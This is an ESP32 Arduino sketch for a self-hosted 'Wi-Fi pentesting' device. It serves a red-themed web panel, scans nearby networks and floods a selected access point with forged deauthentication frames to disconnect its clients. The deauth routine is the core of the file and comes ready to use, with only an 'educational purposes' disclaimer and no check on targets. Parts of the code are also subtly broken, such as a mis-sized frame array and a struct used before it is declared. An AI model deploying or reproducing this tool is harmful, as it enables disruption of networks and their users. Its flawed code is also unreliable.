/*
 * BARA Wi-Fi Pentesting Tool
 * Developer: Ahmed Nour Ahmed from Qena
 * Version: 2.0
 * For educational and authorized testing purposes only
 */

#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include "esp_wpa2.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_http_server.h"
#include "esp_timer.h"
#include "esp_camera.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_sleep.h"
#include "driver/ledc.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_bt_api.h"
#include <ArduinoJson.h>
#include <Update.h>

// Audio includes
#include "audio_example_file.h"

// ==================== CONFIGURATION ====================
const char* AP_SSID = "BARA";
const char* AP_PASSWORD = "A7med@Elshab7";
const int DEAUTH_PACKETS = 1000;
const int SCAN_CHANNELS[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
const int CHANNEL_COUNT = 13;

// ==================== GLOBAL VARIABLES ====================
WebServer server(80);
bool isAttacking = false;
bool isScanning = false;
int currentChannel = 1;
int attackProgress = 0;
String targetSSID = "";
String targetBSSID = "";
int targetChannel = 1;

// ==================== AUDIO & VISUAL EFFECTS ====================
const int LED_PIN = 2;
const int BUZZER_PIN = 25;
bool effectsEnabled = true;

// ==================== HTML CONTENT ====================
const char* MAIN_PAGE = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BARA - Ultimate Wi-Fi Pentesting Tool</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Bloody&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000000;
            background-image: 
                radial-gradient(circle at 10% 20%, #ff0000 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, #8b0000 0%, transparent 20%),
                linear-gradient(45deg, #000000 0%, #1a0000 100%);
            color: #ff0000;
            font-family: 'Orbitron', monospace;
            overflow-x: hidden;
            min-height: 100vh;
            position: relative;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                repeating-linear-gradient(0deg, transparent, transparent 2px, #ff000011 2px, #ff000011 4px),
                repeating-linear-gradient(90deg, transparent, transparent 2px, #ff000008 2px, #ff000008 4px);
            pointer-events: none;
            z-index: -1;
            animation: scanlines 0.1s infinite linear;
        }
        
        @keyframes scanlines {
            0% { transform: translateY(0); }
            100% { transform: translateY(4px); }
        }
        
        .blood-drip {
            position: fixed;
            top: 0;
            width: 2px;
            height: 100px;
            background: linear-gradient(to bottom, #ff0000, transparent);
            animation: drip 3s infinite;
            z-index: 1000;
        }
        
        @keyframes drip {
            0% { transform: translateY(-100px); opacity: 0; }
            50% { opacity: 1; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        
        .header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 3px solid #ff0000;
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, #ff000033, transparent);
            animation: shine 3s infinite;
        }
        
        @keyframes shine {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        .title {
            font-family: 'Bloody', cursive;
            font-size: 4em;
            color: #ff0000;
            text-shadow: 
                0 0 10px #ff0000,
                0 0 20px #ff0000,
                0 0 40px #ff0000,
                0 0 80px #ff0000;
            animation: pulse 2s infinite alternate;
            margin-bottom: 10px;
        }
        
        @keyframes pulse {
            0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000; }
            100% { text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 80px #ff0000; }
        }
        
        .subtitle {
            font-size: 1.2em;
            color: #cc0000;
            margin-bottom: 20px;
        }
        
        .developer {
            font-size: 1em;
            color: #990000;
            margin-bottom: 10px;
        }
        
        .panels {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .panel {
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #ff0000;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 
                0 0 20px #ff0000,
                inset 0 0 20px #330000;
            position: relative;
            overflow: hidden;
        }
        
        .panel::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #ff0000, #8b0000, #ff0000);
            z-index: -1;
            border-radius: 12px;
            animation: borderGlow 3s infinite linear;
        }
        
        @keyframes borderGlow {
            0% { filter: hue-rotate(0deg); }
            100% { filter: hue-rotate(360deg); }
        }
        
        .panel-title {
            font-size: 1.5em;
            color: #ff0000;
            margin-bottom: 15px;
            text-align: center;
            text-shadow: 0 0 10px #ff0000;
        }
        
        .button {
            background: linear-gradient(45deg, #8b0000, #ff0000);
            color: white;
            border: none;
            padding: 12px 24px;
            margin: 5px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Orbitron', monospace;
            font-weight: bold;
            text-transform: uppercase;
            transition: all 0.3s ease;
            box-shadow: 0 0 10px #ff0000;
        }
        
        .button:hover {
            background: linear-gradient(45deg, #ff0000, #8b0000);
            box-shadow: 0 0 20px #ff0000;
            transform: translateY(-2px);
        }
        
        .button:active {
            transform: translateY(0);
        }
        
        .button.danger {
            background: linear-gradient(45deg, #ff0000, #8b0000);
            box-shadow: 0 0 15px #ff0000;
        }
        
        .button.success {
            background: linear-gradient(45deg, #008b00, #00ff00);
            box-shadow: 0 0 15px #00ff00;
        }
        
        .status {
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            background: rgba(255, 0, 0, 0.1);
            border-left: 3px solid #ff0000;
        }
        
        .progress-container {
            width: 100%;
            height: 20px;
            background: #330000;
            border-radius: 10px;
            margin: 10px 0;
            overflow: hidden;
            border: 1px solid #ff0000;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #8b0000, #ff0000);
            width: 0%;
            transition: width 0.3s ease;
            position: relative;
        }
        
        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: progressShine 2s infinite;
        }
        
        @keyframes progressShine {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        .network-list {
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #ff0000;
            border-radius: 5px;
            padding: 10px;
            background: rgba(0, 0, 0, 0.9);
        }
        
        .network-item {
            padding: 8px;
            margin: 5px 0;
            background: rgba(255, 0, 0, 0.1);
            border-radius: 3px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .network-item:hover {
            background: rgba(255, 0, 0, 0.3);
            transform: translateX(5px);
        }
        
        .signal-strength {
            height: 10px;
            background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00);
            border-radius: 2px;
            margin-top: 5px;
        }
        
        .attack-animation {
            text-align: center;
            font-size: 2em;
            color: #ff0000;
            animation: attackPulse 0.5s infinite alternate;
        }
        
        @keyframes attackPulse {
            0% { text-shadow: 0 0 10px #ff0000; }
            100% { text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; }
        }
        
        .terminal {
            background: #000000;
            border: 2px solid #ff0000;
            border-radius: 5px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            color: #00ff00;
            height: 200px;
            overflow-y: auto;
            margin-top: 20px;
            box-shadow: inset 0 0 20px #003300;
        }
        
        .log-entry {
            margin: 5px 0;
            font-size: 0.9em;
        }
        
        .log-time {
            color: #ffff00;
        }
        
        .log-info {
            color: #00ff00;
        }
        
        .log-warning {
            color: #ffff00;
        }
        
        .log-error {
            color: #ff0000;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            border-top: 1px solid #ff0000;
            margin-top: 30px;
            color: #990000;
        }
    </style>
</head>
<body>
    <!-- Blood drip effects -->
    <div class="blood-drip" style="left: 10%; animation-delay: 0s;"></div>
    <div class="blood-drip" style="left: 20%; animation-delay: 1s;"></div>
    <div class="blood-drip" style="left: 30%; animation-delay: 2s;"></div>
    <div class="blood-drip" style="left: 70%; animation-delay: 0.5s;"></div>
    <div class="blood-drip" style="left: 80%; animation-delay: 1.5s;"></div>
    <div class="blood-drip" style="left: 90%; animation-delay: 2.5s;"></div>

    <div class="container">
        <div class="header">
            <h1 class="title">BARA</h1>
            <div class="subtitle">ULTIMATE WI-FI PENTESTING TOOL</div>
            <div class="developer">Developed by: Ahmed Nour Ahmed - Qena</div>
            <div class="subtitle">FOR EDUCATIONAL PURPOSES ONLY</div>
        </div>

        <div class="panels">
            <div class="panel">
                <h2 class="panel-title">NETWORK SCANNER</h2>
                <div class="status" id="scanStatus">Ready to scan networks</div>
                <button class="button" onclick="startScan()">START SCAN</button>
                <button class="button danger" onclick="stopScan()">STOP SCAN</button>
                
                <div class="progress-container">
                    <div class="progress-bar" id="scanProgress"></div>
                </div>
                
                <div class="network-list" id="networkList">
                    <!-- Networks will be listed here -->
                </div>
            </div>

            <div class="panel">
                <h2 class="panel-title">DEAUTH ATTACK</h2>
                <div class="status" id="attackStatus">Select a target network</div>
                
                <div id="targetInfo">
                    <div><strong>Target SSID:</strong> <span id="targetSSID">None</span></div>
                    <div><strong>Target BSSID:</strong> <span id="targetBSSID">None</span></div>
                    <div><strong>Channel:</strong> <span id="targetChannel">-</span></div>
                </div>
                
                <button class="button danger" onclick="startDeauth()" id="deauthBtn" disabled>LAUNCH DEAUTH ATTACK</button>
                <button class="button" onclick="stopDeauth()" id="stopDeauthBtn" disabled>STOP ATTACK</button>
                
                <div class="progress-container">
                    <div class="progress-bar" id="attackProgress"></div>
                </div>
                
                <div id="attackAnimation" style="display: none;">
                    <div class="attack-animation">⚡ ATTACK IN PROGRESS ⚡</div>
                </div>
            </div>
        </div>

        <div class="panel">
            <h2 class="panel-title">SYSTEM TERMINAL</h2>
            <div class="terminal" id="terminal">
                <div class="log-entry"><span class="log-time">[00:00:00]</span> <span class="log-info">System initialized</span></div>
                <div class="log-entry"><span class="log-time">[00:00:00]</span> <span class="log-info">BARA Tool ready</span></div>
            </div>
            <button class="button" onclick="clearTerminal()">CLEAR TERMINAL</button>
            <button class="button" onclick="toggleEffects()" id="effectsBtn">DISABLE EFFECTS</button>
        </div>

        <div class="footer">
            WARNING: This tool is for educational and authorized testing purposes only.<br>
            Unauthorized use is illegal and punishable by law.<br>
            © 2024 BARA - Ahmed Nour Ahmed
        </div>
    </div>

    <script>
        let effectsEnabled = true;
        let audioContext = null;
        
        // Audio functions
        function playAttackSound() {
            if (!effectsEnabled) return;
            
            try {
                if (!audioContext) {
                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
                }
                
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.type = 'sawtooth';
                oscillator.frequency.setValueAtTime(100, audioContext.currentTime);
                oscillator.frequency.exponentialRampToValueAtTime(800, audioContext.currentTime + 0.5);
                
                gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
                
                oscillator.start();
                oscillator.stop(audioContext.currentTime + 0.5);
            } catch (e) {
                console.log('Audio not supported');
            }
        }
        
        function playScanSound() {
            if (!effectsEnabled) return;
            
            try {
                if (!audioContext) {
                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
                }
                
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.type = 'sine';
                oscillator.frequency.setValueAtTime(300, audioContext.currentTime);
                oscillator.frequency.linearRampToValueAtTime(600, audioContext.currentTime + 0.2);
                
                gainNode.gain.setValueAtTime(0.05, audioContext.currentTime);
                gainNode.gain.linearRampToValueAtTime(0, audioContext.currentTime + 0.2);
                
                oscillator.start();
                oscillator.stop(audioContext.currentTime + 0.2);
            } catch (e) {
                console.log('Audio not supported');
            }
        }
        
        function toggleEffects() {
            effectsEnabled = !effectsEnabled;
            document.getElementById('effectsBtn').textContent = 
                effectsEnabled ? 'DISABLE EFFECTS' : 'ENABLE EFFECTS';
            addLog('System', `Effects ${effectsEnabled ? 'enabled' : 'disabled'}`, 'info');
        }
        
        function addLog(system, message, type = 'info') {
            const terminal = document.getElementById('terminal');
            const time = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry';
            logEntry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-${type}">[${system}] ${message}</span>`;
            terminal.appendChild(logEntry);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function clearTerminal() {
            document.getElementById('terminal').innerHTML = '';
            addLog('System', 'Terminal cleared', 'info');
        }
        
        function updateProgressBar(progressId, percentage) {
            const progressBar = document.getElementById(progressId);
            progressBar.style.width = percentage + '%';
        }
        
        // Network scanning functions
        function startScan() {
            playScanSound();
            addLog('Scanner', 'Starting network scan...', 'info');
            document.getElementById('scanStatus').textContent = 'Scanning networks...';
            updateProgressBar('scanProgress', 0);
            
            fetch('/scan')
                .then(response => response.json())
                .then(data => {
                    displayNetworks(data.networks);
                    updateProgressBar('scanProgress', 100);
                    document.getElementById('scanStatus').textContent = `Scan complete: ${data.networks.length} networks found`;
                    addLog('Scanner', `Scan complete: ${data.networks.length} networks found`, 'info');
                })
                .catch(error => {
                    addLog('Scanner', 'Scan failed: ' + error, 'error');
                    document.getElementById('scanStatus').textContent = 'Scan failed';
                });
        }
        
        function stopScan() {
            addLog('Scanner', 'Scan stopped by user', 'warning');
            document.getElementById('scanStatus').textContent = 'Scan stopped';
            updateProgressBar('scanProgress', 0);
        }
        
        function displayNetworks(networks) {
            const networkList = document.getElementById('networkList');
            networkList.innerHTML = '';
            
            networks.forEach(network => {
                const networkItem = document.createElement('div');
                networkItem.className = 'network-item';
                networkItem.onclick = () => selectNetwork(network);
                
                const signalWidth = Math.min(100, Math.max(10, network.rssi + 100));
                
                networkItem.innerHTML = `
                    <strong>${network.ssid}</strong><br>
                    <small>BSSID: ${network.bssid}</small><br>
                    <small>Channel: ${network.channel} | RSSI: ${network.rssi} dBm</small>
                    <div class="signal-strength" style="width: ${signalWidth}%"></div>
                `;
                
                networkList.appendChild(networkItem);
            });
        }
        
        function selectNetwork(network) {
            playScanSound();
            targetSSID = network.ssid;
            targetBSSID = network.bssid;
            targetChannel = network.channel;
            
            document.getElementById('targetSSID').textContent = network.ssid;
            document.getElementById('targetBSSID').textContent = network.bssid;
            document.getElementById('targetChannel').textContent = network.channel;
            document.getElementById('deauthBtn').disabled = false;
            document.getElementById('attackStatus').textContent = `Target set: ${network.ssid}`;
            
            addLog('Target', `Selected: ${network.ssid} (${network.bssid})`, 'info');
        }
        
        // Deauth attack functions
        function startDeauth() {
            if (!targetBSSID) {
                addLog('Attack', 'No target selected', 'error');
                return;
            }
            
            playAttackSound();
            addLog('Attack', `Starting deauth attack on ${targetSSID}`, 'warning');
            document.getElementById('attackStatus').textContent = 'Deauth attack in progress...';
            document.getElementById('deauthBtn').disabled = true;
            document.getElementById('stopDeauthBtn').disabled = false;
            document.getElementById('attackAnimation').style.display = 'block';
            updateProgressBar('attackProgress', 0);
            
            // Simulate attack progress
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 2;
                updateProgressBar('attackProgress', progress);
                
                if (progress >= 100) {
                    clearInterval(progressInterval);
                    document.getElementById('attackStatus').textContent = 'Attack completed';
                    document.getElementById('deauthBtn').disabled = false;
                    document.getElementById('stopDeauthBtn').disabled = true;
                    document.getElementById('attackAnimation').style.display = 'none';
                    addLog('Attack', 'Deauth attack completed', 'info');
                }
            }, 100);
            
            // Send attack command to ESP32
            fetch('/deauth', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    bssid: targetBSSID,
                    channel: targetChannel
                })
            });
        }
        
        function stopDeauth() {
            addLog('Attack', 'Deauth attack stopped by user', 'warning');
            document.getElementById('attackStatus').textContent = 'Attack stopped';
            document.getElementById('deauthBtn').disabled = false;
            document.getElementById('stopDeauthBtn').disabled = true;
            document.getElementById('attackAnimation').style.display = 'none';
            updateProgressBar('attackProgress', 0);
            
            fetch('/stop', { method: 'POST' });
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            addLog('System', 'BARA Interface loaded successfully', 'info');
            addLog('System', 'All systems operational', 'info');
        });
    </script>
</body>
</html>
)rawliteral";

// ==================== WIFI SCANNING ====================
String networksJSON = "[]";

void scanNetworks() {
  isScanning = true;
  addLog("SCANNER", "Starting network scan...");
  
  int n = WiFi.scanNetworks();
  DynamicJsonDocument doc(4096);
  JsonArray networks = doc.createNestedArray("networks");
  
  for (int i = 0; i < n; ++i) {
    JsonObject network = networks.createNestedObject();
    network["ssid"] = WiFi.SSID(i);
    network["bssid"] = WiFi.BSSIDstr(i);
    network["channel"] = WiFi.channel(i);
    network["rssi"] = WiFi.RSSI(i);
    network["encryption"] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Protected";
  }
  
  serializeJson(doc, networksJSON);
  isScanning = false;
  addLog("SCANNER", String(n) + " networks found");
}

// ==================== DEAUTH ATTACK ====================
void launchDeauthAttack(String bssid, int channel) {
  isAttacking = true;
  attackProgress = 0;
  
  addLog("ATTACK", "Starting deauth attack on: " + bssid);
  addLog("ATTACK", "Setting channel to: " + String(channel));
  
  // Set WiFi channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Deauth attack implementation
  for(int i = 0; i < DEAUTH_PACKETS && isAttacking; i++) {
    sendDeauthFrame(bssid);
    attackProgress = (i * 100) / DEAUTH_PACKETS;
    delay(10);
    
    // Visual and audio effects
    if(effectsEnabled) {
      digitalWrite(LED_PIN, !digitalRead(LED_PIN));
      if(i % 100 == 0) playAttackSound();
    }
  }
  
  isAttacking = false;
  attackProgress = 100;
  addLog("ATTACK", "Deauth attack completed");
}

void sendDeauthFrame(String bssid) {
  // Deauth frame structure
  uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00,
    0x01, 0x00
  };
  
  // Convert BSSID string to bytes
  uint8_t targetMAC[6];
  sscanf(bssid.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
         &targetMAC[0], &targetMAC[1], &targetMAC[2], 
         &targetMAC[3], &targetMAC[4], &targetMAC[5]);
  
  // Set destination MAC in packet
  memcpy(&deauthPacket[4], targetMAC, 6);
  memcpy(&deauthPacket[10], targetMAC, 6);
  memcpy(&deauthPacket[16], targetMAC, 6);
  
  // Send packet
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

// ==================== AUDIO EFFECTS ====================
void playAttackSound() {
  for(int i = 0; i < 3; i++) {
    digitalWrite(BUZZER_PIN, HIGH);
    delay(50);
    digitalWrite(BUZZER_PIN, LOW);
    delay(50);
  }
}

void playScanSound() {
  digitalWrite(BUZZER_PIN, HIGH);
  delay(100);
  digitalWrite(BUZZER_PIN, LOW);
}

// ==================== WEB SERVER HANDLERS ====================
void handleRoot() {
  server.send(200, "text/html", MAIN_PAGE);
}

void handleScan() {
  if(isScanning) {
    server.send(200, "application/json", "{\"status\":\"scanning\"}");
    return;
  }
  
  scanNetworks();
  server.send(200, "application/json", networksJSON);
}

void handleDeauth() {
  if(server.hasArg("plain")) {
    String body = server.arg("plain");
    DynamicJsonDocument doc(256);
    deserializeJson(doc, body);
    
    String bssid = doc["bssid"];
    int channel = doc["channel"];
    
    server.send(200, "application/json", "{\"status\":\"attack_started\"}");
    
    // Start attack in separate task
    xTaskCreatePinnedToCore(
      deauthTask,
      "deauth_task",
      4096,
      new AttackParams{bssid, channel},
      1,
      NULL,
      1
    );
  } else {
    server.send(400, "application/json", "{\"error\":\"missing_parameters\"}");
  }
}

void handleStop() {
  isAttacking = false;
  isScanning = false;
  server.send(200, "application/json", "{\"status\":\"stopped\"}");
  addLog("SYSTEM", "All operations stopped");
}

void handleStatus() {
  String status = "{";
  status += "\"attacking\":" + String(isAttacking ? "true" : "false") + ",";
  status += "\"scanning\":" + String(isScanning ? "true" : "false") + ",";
  status += "\"progress\":" + String(attackProgress);
  status += "}";
  
  server.send(200, "application/json", status);
}

// ==================== TASK FUNCTIONS ====================
struct AttackParams {
  String bssid;
  int channel;
};

void deauthTask(void *parameter) {
  AttackParams* params = (AttackParams*)parameter;
  launchDeauthAttack(params->bssid, params->channel);
  delete params;
  vTaskDelete(NULL);
}

// ==================== LOGGING SYSTEM ====================
void addLog(String system, String message) {
  Serial.println("[" + system + "] " + message);
}

// ==================== SETUP & LOOP ====================
void setup() {
  Serial.begin(115200);
  
  // Initialize pins
  pinMode(LED_PIN, OUTPUT);
  pinMode(BUZZER_PIN, OUTPUT);
  
  // Startup sequence
  for(int i = 0; i < 5; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(100);
    digitalWrite(LED_PIN, LOW);
    delay(100);
  }
  
  // Create access point
  WiFi.softAP(AP_SSID, AP_PASSWORD);
  
  addLog("SYSTEM", "BARA Access Point Started");
  addLog("SYSTEM", "SSID: " + String(AP_SSID));
  addLog("SYSTEM", "IP: " + WiFi.softAPIP().toString());
  
  // Setup web server routes
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/deauth", HTTP_POST, handleDeauth);
  server.on("/stop", HTTP_POST, handleStop);
  server.on("/status", handleStatus);
  
  server.begin();
  addLog("SYSTEM", "Web server started");
  addLog("SYSTEM", "BARA Tool Ready - Developed by Ahmed Nour Ahmed");
}

void loop() {
  server.handleClient();
  
  // Visual effects when active
  if(isAttacking && effectsEnabled) {
    digitalWrite(LED_PIN, millis() % 200 < 100);
  }
  
  delay(10);
}
